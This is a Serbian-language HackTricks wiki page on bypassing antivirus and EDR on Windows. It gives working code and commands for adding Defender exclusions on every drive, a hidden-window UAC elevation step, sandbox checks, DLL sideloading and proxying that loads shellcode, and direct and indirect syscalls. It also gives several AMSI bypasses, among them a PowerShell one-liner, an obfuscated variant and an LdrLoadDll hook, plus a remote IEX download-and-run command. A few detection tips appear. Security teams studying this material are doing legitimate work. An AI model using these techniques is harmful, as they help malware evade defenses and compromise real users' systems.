# Zaobilaženje antivirusnog programa (AV)

{{#include ../banners/hacktricks-training.md}}

**Ovu stranicu je prvobitno napisao** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zaustavljanje Defender-a

- [defendnot](https://github.com/es3n1n/defendnot): Alat za zaustavljanje Windows Defender-a.
- [no-defender](https://github.com/es3n1n/no-defender): Alat za zaustavljanje Windows Defender-a uz lažno predstavljanje drugog antivirusnog programa.
- [Onemogućavanje Defender-a ako imate administratorska prava](basic-powershell-for-pentesters/README.md)

### UAC mamac u stilu instalera pre petljanja sa Defender-om

Javni loader-i koji se predstavljaju kao game cheats često dolaze kao nepotpisani Node.js/Nexe instaleri koji prvo **traže od korisnika povišene privilegije**, a tek zatim onesposobljavaju Defender. Postupak je jednostavan:

1. Proverite da li je kontekst administratorski pomoću komande `net session`. Komanda uspeva samo kada korisnik ima administratorska prava, pa neuspeh ukazuje na to da se loader pokreće kao standardni korisnik.
2. Odmah ponovo pokrenite program pomoću glagola `RunAs` da biste prikazali očekivani UAC zahtev za potvrdu, uz očuvanje originalne komandne linije.

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

Žrtve već veruju da instaliraju „crackovan“ softver, pa obično prihvate upit, čime malver dobija potrebna prava da promeni Defender-ovu politiku.<sup>[[26]](#references)</sup>

### Izuzeci `MpPreference` za svaki disk

Nakon podizanja privilegija, lanci poput GachiLoader-a maksimalno iskorišćavaju slepe tačke Defender-a, umesto da potpuno isključe servis. Loader najpre gasi GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a zatim postavlja **izuzetno široke izuzetke** tako da svaki korisnički profil, sistemski direktorijum i prenosivi disk postanu nedostupni skeniranju:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

Ključna zapažanja:

- Petlja prolazi kroz svaki montirani sistem datoteka (D:\, E:\, USB stickove itd.), tako da se **ignoriše svaki budući payload postavljen bilo gde na disku**.
- Izuzimanje ekstenzije `.sys` je predviđeno za buduću upotrebu — napadači zadržavaju mogućnost da kasnije učitavaju nepotpisane drivere, bez ponovnog menjanja Defendera.
- Sve promene se upisuju pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, što kasnijim fazama omogućava da potvrde da su izuzeci sačuvani ili da ih prošire bez ponovnog pokretanja UAC-a.

Pošto se nijedna Defender usluga ne zaustavlja, površne provere stanja i dalje prijavljuju da je „antivirus aktivan“, iako inspekcija u realnom vremenu nikad ne proverava te putanje.<sup>[[26]](#references)</sup>

## **Metodologija izbegavanja AV-a**

Trenutno AV-ovi koriste različite metode za proveru da li je datoteka zlonamerna: statičko otkrivanje, dinamičku analizu i, kod naprednijih EDR-ova, analizu ponašanja.

### **Statičko otkrivanje**

Statičko otkrivanje se postiže označavanjem poznatih zlonamernih stringova ili nizova bajtova u binarnim datotekama ili skriptama, kao i izvlačenjem informacija iz same datoteke (npr. opisa datoteke, naziva kompanije, digitalnih potpisa, ikone, kontrolnog zbira itd.). To znači da vas upotreba poznatih javnih alata može lakše odati, jer su verovatno već analizirani i označeni kao zlonamerni. Postoji nekoliko načina da zaobiđete ovu vrstu otkrivanja:

- **Šifrovanje**

Ako šifrujete binarnu datoteku, AV neće moći da otkrije vaš program, ali će vam biti potreban neki loader koji će ga dešifrovati i pokrenuti u memoriji.

- **Obfuskacija**

Ponekad je dovoljno samo da promenite neke stringove u binarnoj datoteci ili skripti kako biste prošli pored AV-a, ali to može oduzeti dosta vremena, u zavisnosti od toga šta pokušavate da obfuskirate.

- **Prilagođeni alati**

Ako razvijete sopstvene alate, neće postojati poznati zlonamerni potpisi, ali za to je potrebno mnogo vremena i truda.

> [!TIP]
> Dobar način za proveru statičkog otkrivanja u Windows Defenderu je alatka [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ona deli datoteku na više segmenata, a zatim zadaje Defenderu da skenira svaki od njih pojedinačno. Tako vam može tačno pokazati koji stringovi ili bajtovi u binarnoj datoteci bivaju označeni.

Toplo preporučujem da pogledate ovu [YouTube plejlistu](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktičnom izbegavanju AV-a.

### Offline testovi PE funkcija za statičke klasifikatore

Bajtovi upakovanog ili šifrovanog payloada samo su jedan od ulaza statičkog klasifikatora. EMBER2024 izdvaja PE funkcije, uključujući imports, exports, sekcije, zaglavlja i Authenticode podatke.<sup>[[48]](#references)</sup> U jednom eksperimentu s loaderom, dodavanje 141 importa koji su delovali bezazleno smanjilo je zlonamerni skor EMBER2024 za 93%, dok su imports povezani sa malwareom povećali skor. Ovo važi za taj model i te uzorke, a ne predstavlja pouzdano zaobilaženje određenog AV/EDR proizvoda.<sup>[[50]](#references)</sup>

Za ovlašćeni test loadera, zadržite payload i putanju izvršavanja nepromenjenim, menjajte samo jednu predviđenu promenljivu izgradnje po varijanti i upoređujte skorove offline. Pregledajte dobijene PE funkcije, jer promena pri izgradnji može uticati na više grupa funkcija.<sup>[[49]](#references)[[50]](#references)</sup> Da bi predviđeni imports ostali u IAT-u, pozivajte izabrane Win32 API-je iz dohvatljivog koda. Menjajte izbor i raspoređujte mesta poziva između različitih buildova, umesto da pravite fiksnu funkciju za kamuflažu koja može postati potpis. U eksperimentu su zabeleženi i niži skorovi uz validno potpisivanje koda, export stavke i veći broj funkcija koje proširuju `.pdata`; nevažeće potpisivanje imalo je mali uticaj, a uticaj `.pdata` bio je neznatan.<sup>[[50]](#references)</sup>

Paket `thrember` omogućava izdvajanje funkcija i korišćenje benchmark modela. Nakon instalacije, koristite `thrember.download_models("models")` uz postojeći direktorijum `models`, a zatim pokrenite scorer iz njegovog nadređenog direktorijuma: pomoćna funkcija za preuzimanje menja trenutni radni direktorijum. PE klasifikator može da izračuna skor za direktorijum sa buildovima, bez njihovog slanja servisu za skeniranje:<sup>[[48]](#references)</sup>

```python
from pathlib import Path
import lightgbm as lgb
import thrember

model = lgb.Booster(model_file="models/EMBER2024_PE.model")
for sample in sorted(Path("builds").glob("*.exe")):
    print(sample, thrember.predict_sample(model, sample.read_bytes()))
```

Zadržite iste verzije modela i ekstraktora obeležja tokom poređenja. Niži offline rezultat samo pokazuje kako ovaj klasifikator reaguje na izmenjeni binarni fajl; ne dokazuje izbegavanje behavioral analysis, emulation ili nekog drugog modela proizvođača.<sup>[[49]](#references)[[50]](#references)</sup> Za [polimorfizam po izgradnji i kamuflažu spoljnog binarnog fajla u virtuelizovanim payload-ima](virtualized-payload-execution.md#camouflaging-the-outer-go-executable) pogledajte zaseban model izvršavanja.

### **Dynamic analysis**

Dynamic analysis je kada AV pokrene vaš binarni fajl u sandbox-u i prati zlonamerne aktivnosti (npr. pokušaj dešifrovanja i čitanja lozinki iz browser-a, pravljenje minidump-a za LSASS itd.). Sa ovim može biti malo teže raditi, ali evo nekoliko stvari koje možete da uradite da biste izbegli sandbox-e.

- **Sleep before execution** U zavisnosti od načina implementacije, ovo može biti odličan način za zaobilaženje AV-ove dynamic analysis. AV-ovi imaju veoma malo vremena za skeniranje fajlova kako ne bi prekidali korisnikov rad, pa dugi sleep-ovi mogu da ometu analizu binarnih fajlova. Problem je što mnogi AV sandbox-i mogu jednostavno da preskoče sleep, u zavisnosti od načina implementacije.
- **Provera resursa mašine** Sandbox-i obično imaju veoma malo resursa na raspolaganju (npr. < 2GB RAM-a), jer bi u suprotnom mogli da uspore korisnikovu mašinu. Ovde možete biti i veoma kreativni, na primer, proverom temperature CPU-a ili čak brzine ventilatora — nije sve implementirano u sandbox-u.
- **Provere specifične za mašinu** Ako želite da ciljate korisnika čija je radna stanica pridružena domenu "contoso.local", možete proveriti domen računara i utvrditi da li se poklapa sa onim koji ste naveli. Ako se ne poklapa, možete podesiti da se program zatvori.

Ispostavlja se da se ime računara u Microsoft Defender-ovom sandbox-u zove HAL9TH. Zato pre detonacije možete proveriti ime računara u svom malware-u. Ako se ime poklapa sa HAL9TH, to znači da ste unutar Defender-ovog sandbox-a, pa možete podesiti da se program zatvori.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>izvor: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Još nekoliko veoma dobrih saveta od [@mgeeky](https://twitter.com/mariuszbit) za zaobilaženje sandbox-a

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> kanal #malware-dev</p></figcaption></figure>

Kao što smo već rekli u ovom članku, **javni alati** će pre ili kasnije **biti detektovani**, pa treba da se zapitate sledeće:

Na primer, ako želite da dump-ujete LSASS, **da li zaista morate da koristite mimikatz**? Ili biste mogli da upotrebite neki manje poznat projekat koji takođe dump-uje LSASS?

Verovatno je tačan odgovor ovo drugo. Uzmimo mimikatz za primer: verovatno je jedan od najčešće označavanih malware alata od strane AV-ova i EDR-ova, ako ne i najčešće označavan. Iako je sam projekat veoma dobar, veoma je teško raditi s njim i zaobići AV-ove, pa potražite alternative za ono što pokušavate da postignete.

> [!TIP]
> Kada menjate payload-e radi izbegavanja detekcije, obavezno **isključite automatsko slanje uzoraka** u Defender-u i, molimo vas, ozbiljno, **NEMOJTE SLATI NA VIRUSTOTAL** ako vam je cilj dugoročno izbegavanje detekcije. Ako želite da proverite da li određeni AV detektuje vaš payload, instalirajte ga na VM, pokušajte da isključite automatsko slanje uzoraka i testirajte ga tamo dok ne budete zadovoljni rezultatom.

## EXEs vs DLLs

Kad god je moguće, uvek **dajte prednost korišćenju DLL-ova radi izbegavanja detekcije**. Prema mom iskustvu, DLL fajlovi se obično **mnogo ređe detektuju i analiziraju**, pa je ovo veoma jednostavan trik koji u nekim slučajevima može pomoći u izbegavanju detekcije (naravno, ako vaš payload može da se pokreće kao DLL).

Kao što možemo da vidimo na ovoj slici, stopa detekcije DLL payload-a iz Havoc-a na antiscan.me iznosi 4/26, dok je za EXE payload stopa detekcije 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>poređenje na antiscan.me: običan Havoc EXE payload i običan Havoc DLL</p></figcaption></figure>

Sada ćemo pokazati nekoliko trikova koje možete da koristite sa DLL fajlovima da biste bili mnogo neprimetniji.

## DLL Sideloading & Proxying

**DLL Sideloading** koristi redosled pretrage DLL-ova koji primenjuje loader tako što postavlja i aplikaciju žrtve i zlonamerne payload-e jedne pored drugih.

Možete da pronađete programe podložne DLL Sideloading-u pomoću alata [Siofra](https://github.com/Cybereason/siofra) i sledeće powershell skripte:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

Ova komanda će ispisati listu programa podložnih DLL hijacking-u unutar „C:\Program Files\\“ i DLL fajlova koje pokušavaju da učitaju.

Toplo preporučujem da sami **istražite programe podložne DLL Hijacking/Sideloading-u**. Ova tehnika je prilično stealthy kada se pravilno izvede, ali ako koristite javno poznate programe podložne DLL Sideloading-u, lako možete biti uhvaćeni.

Samo postavljanje malicioznog DLL-a sa imenom koje program očekuje da učita neće učitati vaš payload, jer program očekuje određene funkcije unutar tog DLL-a. Da bismo rešili ovaj problem, koristićemo drugu tehniku koja se zove **DLL Proxying/Forwarding**.

**DLL Proxying** prosleđuje pozive koje program upućuje sa proxy (i malicioznog) DLL-a na originalni DLL, čime se čuva funkcionalnost programa i omogućava izvršavanje vašeg payload-a.

Koristiću projekat [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autora [@flangvik](https://twitter.com/Flangvik/).

Ovo su koraci koje sam pratio:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

Poslednja komanda će nam dati 2 fajla: šablon izvornog koda DLL-a i originalni preimenovani DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

Ovo su rezultati:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

I naš shellcode (enkodiran pomoću [SGN](https://github.com/EgeBalci/sgn)) i proxy DLL imaju stopu detekcije 0/26 na [antiscan.me](https://antiscan.me)! Rekao bih da je ovo uspeh.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> **Toplo preporučujem** da pogledate [S3cur3Th1sShit-ov twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading-u, kao i [ippsec-ov video](https://www.youtube.com/watch?v=3eROsG_WNpE) da biste detaljnije saznali više o onome o čemu smo razgovarali.

### Zloupotreba prosleđenih izvoznih funkcija (ForwardSideLoading)

Windows PE moduli mogu da izvoze funkcije koje su zapravo „forwarders“: umesto pokazivača na kod, izvozna stavka sadrži ASCII string u obliku `TargetDll.TargetFunc`. Kada pozivalac razrešava izvoz, Windows loader će:

- Učitati `TargetDll` ako već nije učitan
- Razrešiti `TargetFunc` iz njega

Važna ponašanja koja treba razumeti:
- Ako je `TargetDll` KnownDLL, učitava se iz zaštićenog KnownDLLs imenskog prostora (npr. ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Ako `TargetDll` nije KnownDLL, koristi se uobičajeni redosled pretrage DLL-ova, koji obuhvata i direktorijum modula koji obavlja prosleđivanje.

Ovo omogućava primitivu za indirektni sideloading: pronađite potpisani DLL koji izvozi funkciju prosleđenu modulu čije ime nije KnownDLL, a zatim smestite taj potpisani DLL u isti direktorijum kao DLL pod kontrolom napadača, nazvan tačno kao prosleđeni ciljni modul. Kada se pozove prosleđena izvozna funkcija, loader razrešava prosleđivanje i učitava vaš DLL iz istog direktorijuma, čime se izvršava vaš DllMain.<sup>[[13]](#references)</sup>

Primer zabeležen na Windows 11:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` nije KnownDLL, pa se pronalazi prema uobičajenom redosledu pretrage.

PoC (kopiraj i nalepi):
1) Kopirajte potpisani sistemski DLL u fasciklu u koju može da se upisuje.
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Postavite zlonamerni `NCRYPTPROV.dll` u istu fasciklu. Minimalni DllMain je dovoljan za izvršavanje koda; ne morate da implementirate prosleđenu funkciju da biste pokrenuli DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) Aktivirajte prosleđivanje pomoću potpisanog LOLBin-a:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

Observed behavior:
- rundll32 (signed) učitava side-by-side `keyiso.dll` (signed)
- Prilikom razrešavanja `KeyIsoSetAuditingInterface`, loader prati forwarding do `NCRYPTPROV.SetAuditingInterface`
- Loader zatim učitava `NCRYPTPROV.dll` iz `C:\test` i izvršava njegov `DllMain`
- Ako `SetAuditingInterface` nije implementiran, dobićete grešku „missing API“ tek nakon što je `DllMain` već pokrenut

Hunting tips:
- Fokusirajte se na forwarded exports kod kojih ciljni modul nije KnownDLL. KnownDLL-ovi su navedeni pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Forwarded exports možete da enumerišete alatima kao što je:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Pogledajte inventar Windows 11 forwardera da biste potražili kandidate: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideje za detekciju/odbranu:
- Nadgledajte LOLBins (npr. rundll32.exe) koji učitavaju potpisane DLL-ove sa putanja van sistemskih, a zatim učitavaju DLL-ove koji nisu KnownDLLs, sa istim osnovnim imenom, iz tog direktorijuma
- Upozoravajte na lance procesa/modula kao što je: `rundll32.exe` → `keyiso.dll` van sistemskih putanja → `NCRYPTPROV.dll` u putanjama u koje korisnik može da upisuje
- Sprovodite politike integriteta koda (WDAC/AppLocker) i zabranite upisivanje i izvršavanje u direktorijumima aplikacija

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze je skup alata za payload-e koji za zaobilaženje EDR-ova koristi suspendovane procese, direktne syscalls i alternativne metode izvršavanja`

Freeze možete koristiti za učitavanje i izvršavanje svog shellcode-a na prikriven način.

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion je samo igra mačke i miša: ono što danas funkcioniše, sutra može biti detektovano, zato se nikada ne oslanjajte samo na jedan alat; ako je moguće, pokušajte da kombinujete više tehnika za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDR-ovi često postavljaju **user-mode inline hooks** na `ntdll.dll` syscall stubove. Da biste zaobišli te hookove, možete generisati **direct** ili **indirect** syscall stubove koji učitavaju ispravan **SSN** (System Service Number) i prelaze u kernel mode bez izvršavanja zakačenog export entrypoint-a.<sup>[[32]](#references)</sup>

**Opcije pozivanja:**
- **Direct (embedded)**: emituje instrukciju `syscall`/`sysenter`/`SVC #0` u generisanom stubu (ne poziva `ntdll` export).
- **Indirect**: skače na postojeći `syscall` gadget unutar `ntdll`, tako da izgleda kao da prelaz u kernel potiče iz `ntdll` (korisno za izbegavanje heurističke detekcije); **randomized indirect** pri svakom pozivu bira gadget iz grupe.
- **Egg-hunt**: izbegava ugrađivanje statičkog niza opcode-ova `0F 05` na disk; pronalazi syscall sekvencu tokom izvršavanja.

**Strategije za rezoluciju SSN-a otporne na hookove:**
- **FreshyCalls (VA sort)**: određuje SSN-ove sortiranjem syscall stubova prema virtuelnoj adresi, umesto čitanjem bajtova stubova.
- **SyscallsFromDisk**: mapira čistu datoteku `\KnownDlls\ntdll.dll`, čita SSN-ove iz njenog odeljka `.text`, a zatim je odmapira (zaobilazi sve hookove u memoriji).
- **RecycledGate**: kombinuje određivanje SSN-a sortiranjem VA adresa sa proverom opcode-ova kada je stub čist; ako je zakačen, koristi određivanje prema VA adresama.
- **HW Breakpoint**: postavlja DR0 na instrukciju `syscall` i koristi VEH za hvatanje SSN-a iz `EAX` tokom izvršavanja, bez parsiranja zakačenih bajtova.

Primer upotrebe SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

When parsujete čiste x64 `ntdll` syscall izvoze da biste pronašli SSN, dozvolite i `4C 8B D1 B8` (`mov r10, rcx; mov eax, imm32`) i isti niz kojem prethodi `F3 0F 1E FA` (`endbr64`). Drugi slučaj je stub sa CET prefiksom: parser koji pretpostavlja da se SSN uvek nalazi na jednom fiksnom pomeraju neće ga pronaći. Ako inicijalizacija indirect-syscall ne uspe i loader pređe na `GetProcAddress`, pozivi kroz te izvoze mogu ponovo naići na user-mode hook-ove.<sup>[[54]](#references)</sup>

## AMSI (Anti-Malware Scan Interface)

AMSI je napravljen da spreči „[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)“. U početku su AV rešenja mogla da skeniraju samo **datoteke na disku**, pa AV nije mogao ništa da preduzme ako biste nekako uspeli da izvršite payload **direktno u memoriji**, jer nije imao dovoljno uvida.

AMSI je integrisan u sledeće Windows komponente.

- User Account Control ili UAC (podizanje privilegija za EXE, COM, MSI ili ActiveX instalaciju)
- PowerShell (skripte, interaktivna upotreba i dinamičko izvršavanje koda)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- Office VBA makroi

Omogućava antivirusnim rešenjima da pregledaju ponašanje skripti tako što izlaže njihov sadržaj u nešifrovanom i neofuskiranom obliku.

Pokretanje komande `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` izazvaće sledeće upozorenje u Windows Defender-u.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Obratite pažnju na to kako se dodaje prefiks `amsi:`, a zatim putanja do izvršne datoteke iz koje je skripta pokrenuta — u ovom slučaju, powershell.exe

Nismo zapisali nijednu datoteku na disk, ali smo ipak bili otkriveni u memoriji zbog AMSI-ja.

Pored toga, počevši od **.NET 4.8**, C# kod se takođe proverava kroz AMSI. To utiče čak i na `Assembly.Load(byte[])` pri učitavanju koda za izvršavanje u memoriji. Zato se za izvršavanje u memoriji preporučuje upotreba starijih verzija .NET-a (kao što je 4.7.2 ili starija) ako želite da izbegnete AMSI.

Postoji nekoliko načina da zaobiđete AMSI:

- **Obfuskacija**

Pošto AMSI uglavnom koristi statičku detekciju, izmena skripti koje pokušavate da učitate može biti dobar način da izbegnete detekciju.

Međutim, AMSI može da deobfuskuje skripte čak i kada imaju više slojeva obfuskacije, pa obfuskacija može biti loš izbor, u zavisnosti od načina na koji je izvedena. Zbog toga izbegavanje detekcije nije baš jednostavno. Ipak, ponekad je dovoljno promeniti nekoliko imena promenljivih, pa sve zavisi od toga koliko je nešto označeno kao sumnjivo.

- **AMSI Bypass**

Pošto se AMSI implementira učitavanjem DLL-a u proces powershell-a (kao i cscript.exe, wscript.exe itd.), moguće je lako menjati ga čak i kada se izvršava kao neprivilegovan korisnik. Zbog ovog nedostatka u AMSI implementaciji, istraživači su pronašli više načina da izbegnu AMSI skeniranje.

**Izazivanje greške**

Izazivanje neuspeha AMSI inicijalizacije (`amsiInitFailed`) dovešće do toga da se skeniranje ne pokrene za trenutni proces. Ovo je prvobitno otkrio [Matt Graeber](https://twitter.com/mattifestation), a Microsoft je razvio potpis kako bi sprečio širu upotrebu.

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

Bila je potrebna samo jedna linija PowerShell koda da bi AMSI postao neupotrebljiv u trenutnom PowerShell procesu. AMSI je, naravno, već označio ovu liniju, pa je potrebna određena izmena da bi se ova tehnika koristila.

Evo izmenjenog AMSI bypass-a koji sam preuzeo sa ovog [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

Imajte na umu da će ovo verovatno biti označeno kada ova objava bude objavljena, zato nemojte objavljivati nikakav kod ako vam je cilj da ostanete neotkriveni.

**Memory Patching**

Ovu tehniku je prvobitno otkrio [@RastaMouse](https://twitter.com/_RastaMouse/). Ona podrazumeva pronalaženje adrese funkcije "AmsiScanBuffer" u amsi.dll (odgovorne za skeniranje unosa koji je dostavio korisnik) i njeno prepisivanje instrukcijama koje vraćaju kod za E_INVALIDARG. Na taj način rezultat stvarnog skeniranja iznosi 0, što se tumači kao čist rezultat.

> [!TIP]
> Pročitajte [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) za detaljnije objašnjenje.

Postoje i mnoge druge tehnike za zaobilaženje AMSI-ja pomoću powershell-a. Pogledajte [**ovu stranicu**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**ovaj repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) da biste saznali više o njima.

### Preusmeravanje AMSI COM scan-pointer-a umesto patchovanja `AmsiScanBuffer`

Još jedan bypass ograničen na proces ne menja ulaznu tačku `AmsiScanBuffer`. U opisanom 64-bitnom .NET loader-u, AMSI COM objekat se kreira iz CLSID-ja `fdb00e52-a214-4aa1-8fba-4357bb0072ec`; `Marshal.GetIUnknownForObject()` vraća pokazivač na interfejs, a njegov vtable slot na pomeraju `0x18` koristi se kao cilj poziva za skeniranje. Loader patchuje nativni pokazivač za `Console.Clear()` malim x64 stub-om, menja taj vtable unos pod `VirtualProtect()`, a zatim vraća prvobitnu zaštitu stranice. Preduslovi su širina 64-bitnog pokazivača i očekivani COM raspored; ovo nije generički pomeraj za proizvoljne AMSI interfejse ili verzije. Ranije uočene faze su [učitavanje potpisanog AppDomainManager sidecar-a](windows-local-privilege-escalation/dll-hijacking/#signed-appdomainmanager-type-as-a-configuration-file-gadget) i [RESX deserializacija](../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md#resx-resource-parsing-to-binaryformatter-and-xaml).<sup>[[51]](#references)</sup>

Uočeni bajtovi stub-a su `41 C7 00 01 00 00 00 33 C0 C3`: upisuju **1** u pokazivač rezultata u `r8` i vraćaju **0** u `eax`. Zato se u opisanom slučaju tvrdnjom da je rezultat skeniranja `AMSI_RESULT_CLEAN` (0) mešaju povratna vrednost `S_OK` i izlazni enum. Prema dokumentovanom redosledu `AMSI_RESULT`, rezultat **1** je `AMSI_RESULT_NOT_DETECTED`; i dalje je ispod praga detekcije.<sup>[[51]](#references)[[52]](#references)[[53]](#references)</sup>

### Blokiranje AMSI-ja sprečavanjem učitavanja amsi.dll (LdrLoadDll hook)

AMSI se inicijalizuje tek nakon što se `amsi.dll` učita u trenutni proces. Robustan bypass nezavisan od jezika jeste postavljanje user-mode hook-a na `ntdll!LdrLoadDll` koji vraća grešku kada je traženi modul `amsi.dll`. Zbog toga se AMSI nikada ne učitava i u tom procesu se ne vrše skeniranja.<sup>[[23]](#references)</sup>

Okvirni prikaz implementacije (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Beleške
- Radi sa PowerShell, WScript/CScript i prilagođenim loader-ima (sa bilo čim što bi inače učitalo AMSI).
- Kombinujte sa prosleđivanjem skripti preko stdin-a (`PowerShell.exe -NoProfile -NonInteractive -Command -`) da biste izbegli dugačke artefakte komandne linije.
- Primećeno je da ga koriste loader-i pokrenuti preko LOLBins (npr. `regsvr32` koji poziva `DllRegisterServer`).

Alat **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** takođe generiše skriptu za zaobilaženje AMSI-ja.
Alat **[https://amsibypass.com/](https://amsibypass.com/)** takođe generiše skriptu za zaobilaženje AMSI-ja koja izbegava signature pomoću nasumično generisane korisnički definisane funkcije, promenljivih i izraza znakova, a na ključne reči u PowerShell-u primenjuje nasumične kombinacije velikih i malih slova kako bi izbegla signature.

**Uklonite otkriveni potpis**

